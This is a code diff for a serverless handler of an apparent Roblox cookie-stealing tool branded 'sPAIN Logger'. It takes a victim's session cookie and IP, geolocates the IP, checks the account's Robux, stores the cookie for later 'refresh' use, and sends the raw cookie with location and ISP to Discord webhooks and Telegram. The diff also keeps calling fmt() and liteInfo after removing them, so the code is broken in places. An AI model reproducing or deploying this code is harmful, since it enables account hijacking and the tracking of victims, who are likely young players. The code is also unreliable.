@@ -26,12 +26,13 @@ async function redisGet(key) {
   } catch { return null; }
 }
 
+// No TTL — cookie stays forever until manually deleted or Roblox logs them out
 async function redisSet(key, value) {
   try {
-    const res = await fetch(`${REDIS_URL}/set/${encodeURIComponent(key)}`, {
+    const res = await fetch(`${REDIS_URL}/pipeline`, {
       method: 'POST',
       headers: { Authorization: `Bearer ${REDIS_TOKEN}`, 'Content-Type': 'application/json' },
-      body: JSON.stringify({ value: JSON.stringify(value) })
+      body: JSON.stringify([['SET', key, JSON.stringify(value), 'EX', 2592000]])
     });
     return res.ok;
   } catch { return false; }
@@ -46,16 +47,17 @@ async function getIpGeo(ip) {
   } catch { return null; }
 }
 
-async function getLiteInfo(cookie, victimIp) {
+// Lite mode — only fetches robux, super fast (2 API calls)
+async function getRobux(cookie) {
   try {
     const r = await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie, victimIp, lite: true })
+      body: JSON.stringify({ cookie, lite: true })
     });
     if (!r.ok) return null;
     const d = await r.json();
-    return d.valid ? d : null;
+    return d.valid ? d.robux : null;
   } catch { return null; }
 }
 
@@ -118,8 +120,6 @@ async function discordChunked(url, text) {
   }
 }
 
-function fmt(n) { return Number(n || 0).toLocaleString(); }
-
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
@@ -149,27 +149,24 @@ export default async function handler(req, res) {
     } catch (_) {}
   }
 
-  const [geo, liteInfo] = await Promise.all([
+  // Get geo and robux in parallel — both fast
+  const [geo, robux] = await Promise.all([
     getIpGeo(ip),
-    cookie ? getLiteInfo(cookie, ip) : Promise.resolve(null)
+    cookie ? getRobux(cookie) : Promise.resolve(null)
   ]);
 
-  const location = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
-
-  // ── No cookie at all ───────────────────────────────────────────────────────
   if (!cookie) {
     for (const wh of webhooks) {
       await discordSend(wh, {
         embeds: [{
-          title:       '⚠️ Wrong Cookie — Troll Detected',
-          description: 'Invalid or missing cookie.',
-          color:       0xff3333,
+          title: '⚠️ No valid cookie submitted',
+          color: 0xff3333,
           fields: [
-            { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
-            { name: '📍 Location', value: location,         inline: true },
-            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true }
+            { name: '🌐 IP',       value: ip || 'Unknown',                                                   inline: true },
+            { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true },
+            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                             inline: true }
           ],
-          footer: { text: `sPAIN Logger • ${pageName} • ${now}` },
+          footer:    { text: `sPAIN Tools • ${pageName}` },
           timestamp: now
         }]
       });
@@ -177,30 +174,7 @@ export default async function handler(req, res) {
     return res.status(200).json({ success: true });
   }
 
-  // ── Cookie found but Roblox rejected it ────────────────────────────────────
-  if (!liteInfo) {
-    for (const wh of webhooks) {
-      await discordSend(wh, {
-        embeds: [{
-          title:       '⚠️ Wrong Cookie — Troll Detected',
-          description: 'Cookie submitted but Roblox rejected it.',
-          color:       0xff3333,
-          fields: [
-            { name: '🌐 IP',       value: ip || 'Unknown', inline: true },
-            { name: '📍 Location', value: location,         inline: true },
-            { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true }
-          ],
-          footer: { text: `sPAIN Logger • ${pageName} • ${now}` },
-          timestamp: now
-        }]
-      });
-      // Still send the cookie even if rejected
-      await discordChunked(wh, cookie);
-    }
-    return res.status(200).json({ success: true });
-  }
-
-  // ── Valid cookie ───────────────────────────────────────────────────────────
+  // Save cookie — NO TTL, stays until cookie dies or you delete it
   const refreshId  = generateId();
   const refreshUrl = `https://spain-tools.vercel.app/api/refresh?id=${refreshId}`;
 
@@ -210,75 +184,38 @@ export default async function handler(req, res) {
     webhook1:  webhooks[1] || null,
     pageName,
     ip,
-    isp:       geo?.isp || 'Unknown',
     createdAt: now
   });
 
+  // Send the 4-field embed + raw cookie + dashboard link
   for (const wh of webhooks) {
     await discordSend(wh, {
       content: '@everyone',
       embeds: [{
-        title:       '💰 Robux & Info',
-        color:       0x5865f2,
-        thumbnail:   { url: liteInfo.avatarUrl },
+        title:       '🍪 Cookie Captured',
+        description: ':fire: `sPAIN` :fire:',
+        color:       0xc026d3,
         fields: [
-          // Row 1 — username spans full width so it stands out
-          {
-            name:   '👤 Username',
-            value:  `\`${liteInfo.username}\` (ID: ${liteInfo.id})`,
-            inline: false
-          },
-          // Row 2 — robux
-          {
-            name:   '💰 Balance',
-            value:  `\`${fmt(liteInfo.robux)} R$\``,
-            inline: true
-          },
-          {
-            name:   '⏳ Pending',
-            value:  `\`${fmt(liteInfo.pendingRobux)} R$\``,
-            inline: true
-          },
-          // invisible spacer
-          { name: '\u200b', value: '\u200b', inline: true },
-          // Row 3 — network info
-          {
-            name:   '🌐 IP',
-            value:  ip || 'Unknown',
-            inline: true
-          },
-          {
-            name:   '📍 Location',
-            value:  location,
-            inline: true
-          },
-          {
-            name:   '🗺️ ISP',
-            value:  geo?.isp || 'Unknown',
-            inline: true
-          },
-          // Row 4 — refresh link
-          {
-            name:   '🔄 Refresh',
-            value:  `[Open Dashboard](${refreshUrl})`,
-            inline: false
-          }
+          { name: '🌐 IP',        value: ip || 'Unknown',                                                                    inline: true  },
+          { name: '📍 Location',  value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
+          { name: '🗺️ ISP',       value: geo?.isp || 'Unknown',                                                              inline: true  },
+          { name: '💰 Robux',     value: robux !== null ? `\`${Number(robux).toLocaleString()} R$\`` : '`Fetching...`',      inline: true  },
+          { name: '📈 Summary',   value: `Day: \`${fmt(liteInfo.txDay)} R$\` | Week: \`${fmt(liteInfo.txWeek)} R$\` | Year: \`${fmt(liteInfo.txYear)} R$\``, inline: false },
+          { name: '🔄 Dashboard', value: `[Open Dashboard](${refreshUrl})`,      inline: false }
         ],
         footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
         timestamp: now
       }]
     });
 
-    // Raw cookie
+    // Raw cookie as plain text — exact bytes
     await discordChunked(wh, cookie);
   }
 
   await tgSend([
     `🍪 <b>COOKIE — ${pageName}</b>`,
-    `👤 ${liteInfo.username} (#${liteInfo.id})`,
-    `💰 Robux: ${fmt(liteInfo.robux)} | Pending: ${fmt(liteInfo.pendingRobux)}`,
-    `🌐 <code>${ip}</code> — ${location}`,
-    `🗺️ ${geo?.isp || '?'}`,
+    `🌐 <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+    `💰 Robux: ${robux !== null ? Number(robux).toLocaleString() : '?'}`,
     `🔄 ${refreshUrl}`
   ].join('\n'));
 
